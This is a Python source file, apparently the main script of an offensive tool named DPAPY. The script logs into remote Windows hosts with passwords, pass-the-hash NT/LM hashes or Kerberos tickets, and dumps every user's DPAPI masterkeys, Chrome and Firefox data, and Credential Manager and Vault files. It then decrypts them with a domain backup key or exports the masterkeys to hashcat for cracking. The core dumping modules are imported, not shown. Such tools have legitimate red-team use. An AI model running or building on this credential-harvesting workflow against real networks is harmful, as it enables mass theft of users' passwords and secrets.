import sys
import Core.DPAPYCrypto.CryptoUtils
import Core.DPAPYBrowser.ChromeBrowser
import Core.DPAPYBrowser.FirefoxBrowser
import Core.DPAPYSearcher.LocalSystemSearcher
import argparse
import logging
from Core.Dpapy import *
global LOG

LOG: logging.Logger

def main(options,target):
    if options.decryptlocal != "" or options.decryptlocalall:
        if options.decryptlocal != "":
            print("\n\n[---------------------------- DECRYPTING  ----------------------------]\n")
            localSystemSearcher = Core.DPAPYSearcher.LocalSystemSearcher.LocalSearch(options,options.output)
            localSystemSearcher.decryptAllLocalMasterKey()
            sys.exit(0)
        else:
            sys.exit(0)
    print("\n\n[---------------------------- DUMPING : " + target + " ----------------------------]\n")
    remoteSystemSearcher = RemoteSystemSearching(options,target)
    dpapy = Dpapy(remoteSystemSearcher,options)
    allWindowsUsers = dpapy.generateUserDumpList()
    # MASTERKEY DUMP
    if options.masterkey is True or options.all is True:
        print("\n[------------ MASTERKEY SECTION ------------]\n")
        allWindowsUserWLocalPaths = remoteSystemSearcher.dumpMasterkeyFilesAllUsers(allWindowsUsers)
        if options.pvk_key != "":
            Core.DPAPYCrypto.CryptoUtils.decryptAllMasterKeyWithPVK(allWindowsUserWLocalPaths, options.pvk_key)
        if options.hashcat or options.pvk_key == "":
            Core.DPAPYCrypto.CryptoUtils.allMasterkeyToHashcat(allWindowsUserWLocalPaths)

    # BROWSER DUMP
    if options.chrome is True or options.firefox is True or options.all is True:
        print("\n[------------ BROWSERS SECTION ------------]\n")
        if options.chrome is True or options.all is True:
            allWindowsUserWLocalPaths = remoteSystemSearcher.dumpChromeFilesAllUsers(allWindowsUsers)
            Core.DPAPYBrowser.ChromeBrowser.extractAllDataChrome(allWindowsUserWLocalPaths)
        if options.firefox is True or options.all is True:
            allWindowsUserWLocalPaths = remoteSystemSearcher.dumpFirefoxFilesAllUsers(allWindowsUsers)
            Core.DPAPYBrowser.FirefoxBrowser.extractAllDataFirefox(allWindowsUserWLocalPaths)

    # CREDENTIALS / VAULT DUMP
    if options.all is True or options.credentials is True or options.vault is True:
        print("\n[------------ MISC SECTION ------------]\n")
        if options.credentials is True or options.all is True :
            allWindowsUserWLocalPaths = remoteSystemSearcher.dumpCredentialsFilesAllUsers(allWindowsUsers)
            if options.pvk_key != "":
                Core.DPAPYCrypto.CryptoUtils.decryptAllCredentialsFiles(allWindowsUserWLocalPaths)
        if options.vault is True or options.all is True:
            allWindowsUserWLocalPaths = remoteSystemSearcher.dumpVautlFilesAllUsers(allWindowsUsers)
            if options.pvk_key != "":
                Core.DPAPYCrypto.CryptoUtils.decryptAllVaultFiles(allWindowsUserWLocalPaths)

    return
def initLogging(options):
    if (options.debug):
        logging.basicConfig(
            format="%(asctime)s - %(levelname)s - %(message)s", level=logging.DEBUG)
        logging.debug("DEBUG MODE ON")
    if (options.error):
        logging.basicConfig(
            format="%(asctime)s - %(levelname)s - %(message)s", level=logging.ERROR)
        logging.debug("ERROR MODE ON")
    elif (options.critical):
        logging.basicConfig(
            format="%(asctime)s - %(levelname)s - %(message)s", level=logging.CRITICAL)
        logging.debug("CRITICAL MODE ON")
    else:
        logging.basicConfig(
            format="%(asctime)s - %(levelname)s - %(message)s", level=logging.FATAL)
        logging.debug("STANDARD MODE ON")
    return
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-a', '--all', required=False, dest="all",action="store_true",help="Perform all dump and checks")
    parser.add_argument('-t', '--target',default="", required=False, dest="target",help="A single target. IP or hostname")
    parser.add_argument('-tl', '--target-list', required=False,default="",dest="iplist",help="A target list made from IP or hostname. Separator ,")
    parser.add_argument('-oh','--hashcat', action="store_true",required=False,dest="hashcat",help="Wish to crack all the masterkeys you dumped ? Use this arg.")
    parser.add_argument('-u', '--username', default="", dest="username",help="Username to auth with", required=False)
    parser.add_argument('-d', '--domain', default="", dest="domain",help="Domain to auth with")
    parser.add_argument('-p', '--password', default="", dest="password",help="Password of the associated username")
    parser.add_argument('-nt', '--hash-nt', default="", dest="nt", help="NT hash of the user")
    parser.add_argument('-lm', '--hash-lm', default="", dest="lm", help="LM hash of the user")
    parser.add_argument('-v', default=False, action='store_true', dest="critical",help="Turn on debug")
    parser.add_argument('-vv', default=False, action='store_true', dest="error", help="Turn on debug ++")
    parser.add_argument('-vvv', default=False, action='store_true', dest="debug", help="Turn on debug ++++")
    parser.add_argument('-pvk', '--pvk-key', default="", dest="pvk_key",help="DPAPI Domain backup key (Dump it with dpapi.py from impacket : need D.A eq rights)")
    parser.add_argument('-du', '--default-users', default=False,action="store_true", dest="defaultusers", help="Include the following default users : All Users,Default,Default User,Public")
    parser.add_argument('-o', '--output', default="Output", dest="output",help="Output dir")
    parser.add_argument('-dlm', '--decrypt-local-masterkey', default="", dest="decryptlocal",
                        help="[TODO] Try to decrypt all the local masterkey.Take a file in entry with one password per line,can also take a pvk key.\nIf the output dir is not the default one please specify the path with -o")
    parser.add_argument('-dla', '--decrypt-local-all', default="", dest="decryptlocalall", required=False,
                        help="[TODO] Try to decrypt all the local files(masterkey,chrome,vcr, ..).\n [Optionnal] Take a file in entry with one password per line,can also take a pvk key.\nIf the output dir is not the default one please specify the path with -o")

    parser.add_argument('-crd', '--credentials', default=False,action='store_true', dest="credentials", help="Dump all the credentials files of the target")
    parser.add_argument('-vlt', '--vault', default=False, action='store_true', dest="vault",help="Dump all the vault files of the target")
    parser.add_argument('-mtr', '--masterkey', default=False,action="store_true", dest="masterkey",help="Dump all the masterkeys of the target")
    parser.add_argument('-frf', '--firefox', default=False, action='store_true', dest="firefox", help="Dump all the firefox file of the target")
    parser.add_argument('-chr', '--chrome', default=False, action='store_true', dest="chrome", help="Dump all the chrome file of the target")


    parser.add_argument('-k', '--kerberos', required=False,
                           help='Use Kerberos authentication. Grabs credentials from ccache file '
                                '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                                'ones specified in the command line')
    parser.add_argument('-l', '--light', default=False, dest="light",
                        help="Dump only light files")
    parser.add_argument('-s', '--shadow_copy', default=False, dest="shadow",action="store_true",
                        help="Try to access the targeted files in case they are in STATUS_SHARING_VIOLATION")
    options = parser.parse_args()

    print("""                                                                               
    ,------.  ,------.   ,---.  ,------.,--.   ,--.                   ,--.     ,--. 
    |  .-.  \ |  .--. ' /  O  \ |  .--. '\  `.'  /         ,--.  ,--./    \   /   | 
    |  |  \  :|  '--' ||  .-.  ||  '--' | '.    /           \  `'  /|  ()  |  `|  | 
    |  '--'  /|  | --' |  | |  ||  | --'    |  |             \    /  \    /.--.|  | 
    `-------' `--'     `--' `--'`--'        `--'              `--'    `--' '--'`--' 

        """)

    initLogging(options)
    # We do need to dump the masterkey to crack them .. :)
    if(options.hashcat is True and (options.masterkey is False and options.all is False)):
        parser.print_help()
        print("\nInfo : -mtr or --all is required to use --hashcat")
        sys.exit(1)
    if(options.decryptlocalall != "" or options.decryptlocal != ""):
        main(options, None)
    #Check if the user entered some valid accounts or a kerberos ticket. In case of a username w/ password : ask the user to enter a password
    if((options.username == '' and options.password == '') or (options.kerberos == False and options.domain == '' and options.username == '')):
        parser.print_help()
        sys.exit(1)
    elif(options.username != '' and (options.password =='' and options.nt =='' and options.lm == '')):
        from getpass import getpass
        options.password = getpass("Password :")
    # Check that --mst is present to use --hashcat
    # Check if we have at least a -t or a -tl : if not print help
    if(options.iplist != "" and options.target == ""):
        for entry in options.iplist.split(","):
            main(options,entry)
    elif(options.target!= "" and options.iplist ==""):
        main(options,options.target)
    else:
        parser.print_help()
        print("\nInfo : One and only one is required : --target or --target-list")
        sys.exit(1)

#TODO : Roaming folder for Credentials & Vaults
#TODO : Aggregate the domain + filter out
#TO_VALIDATE : Decrypt credentials files
#TODO : Decrypt cookies & login data from chrome https://github.com/mis-team/dpapick/tree/master/examples
#TODO : Ask the DC with RPC when we know the password to decrypt the key OR if we know the user password just decrypt it (DPAPI.py ?)
    # i.e : def derivedKeyFromUser
#TODO : List shadow copy in case we can't access some files (i.e : Login Data for Chrome)
#TODO : Return hash from allMasterkeyToHashcat to write the file at a desired location